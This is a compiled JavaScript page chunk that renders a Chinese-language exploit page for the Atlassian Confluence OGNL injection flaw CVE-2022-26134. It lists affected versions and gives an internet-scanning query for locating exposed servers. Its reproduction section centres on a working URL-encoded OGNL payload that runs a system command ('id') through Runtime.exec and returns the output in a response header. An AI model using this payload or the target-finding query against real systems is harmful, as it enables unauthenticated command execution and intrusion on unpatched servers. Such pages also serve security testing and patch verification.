(window.webpackJsonp=window.webpackJsonp||[]).push([[354],{1877:function(s,t,a){s.exports=a.p+"assets/img/1630488806824-a8205673-933b-434b-8050-abcde3ef3e97-20220604093234758.d63dc073.png"},1878:function(s,t,a){s.exports=a.p+"assets/img/1654306027118-48bf3912-970a-403a-900a-dcfdd95b0cb9.c9942dd2.png"},2770:function(s,t,a){"use strict";a.r(t);var r=a(75),e=Object(r.a)({},(function(){var s=this,t=s.$createElement,r=s._self._c||t;return r("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[r("h1",{attrs:{id:"atlassian-confluence-ognl注入漏洞-cve-2022-26134"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#atlassian-confluence-ognl注入漏洞-cve-2022-26134"}},[s._v("#")]),s._v(" Atlassian Confluence OGNL注入漏洞 CVE-2022-26134")]),s._v(" "),r("h2",{attrs:{id:"漏洞描述"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),r("p",[s._v("Atlassian Confluence是企业广泛使用的wiki系统。2022年6月2日Atlassian官方发布了一则安全更新，通告了一个严重且已在野利用的代码执行漏洞，攻击者利用这个漏洞即可无需任何条件在Confluence中执行任意命令。")]),s._v(" "),r("h2",{attrs:{id:"漏洞影响"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),r("a-checkbox",{attrs:{checked:""}},[s._v("7.4.17")]),r("br"),s._v(" "),r("a-checkbox",{attrs:{checked:""}},[s._v("7.13.7")]),r("br"),s._v(" "),r("a-checkbox",{attrs:{checked:""}},[s._v("7.14.3")]),r("br"),s._v(" "),r("a-checkbox",{attrs:{checked:""}},[s._v("7.15.2")]),r("br"),s._v(" "),r("a-checkbox",{attrs:{checked:""}},[s._v("7.16.4")]),r("br"),s._v(" "),r("a-checkbox",{attrs:{checked:""}},[s._v("7.17.4")]),r("br"),s._v(" "),r("a-checkbox",{attrs:{checked:""}},[s._v("7.18.1")]),r("br"),s._v(" "),r("h2",{attrs:{id:"网络测绘"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),r("a-checkbox",{attrs:{checked:""}},[s._v('app="ATLASSIAN-Confluence"')]),r("br"),s._v(" "),r("h2",{attrs:{id:"漏洞复现"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),r("p",[s._v("登录页面")]),s._v(" "),r("p",[r("img",{attrs:{src:a(1877),alt:"img"}})]),s._v(" "),r("p",[s._v("验证POC")]),s._v(" "),r("div",{staticClass:"language-php line-numbers-mode"},[r("pre",{pre:!0,attrs:{class:"language-php"}},[r("code",[r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("24")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v("B"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("23")]),s._v("a"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("D"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("40")]),s._v("org"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("apache"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("commons"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("io"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("IOUtils"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("40")]),s._v("toString"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("40")]),s._v("java"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("lang"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("Runtime"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("40")]),s._v("getRuntime"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("29.")]),s._v("exec"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v("id"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("29.")]),s._v("getInputStream"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("29")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("C"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v("utf"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("8")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("29")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("29.")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("40")]),s._v("com"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("opensymphony"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("webwork"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("ServletActionContext"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("40")]),s._v("getResponse"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("29.")]),s._v("setHeader"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v("X"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Cmd"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Response"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("C"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("23")]),s._v("a"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("29")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("29")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v("D"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("\n")])]),s._v(" "),r("div",{staticClass:"line-numbers-wrapper"},[r("span",{staticClass:"line-number"},[s._v("1")]),r("br")])]),r("p",[r("img",{attrs:{src:a(1878),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=e.exports}}]);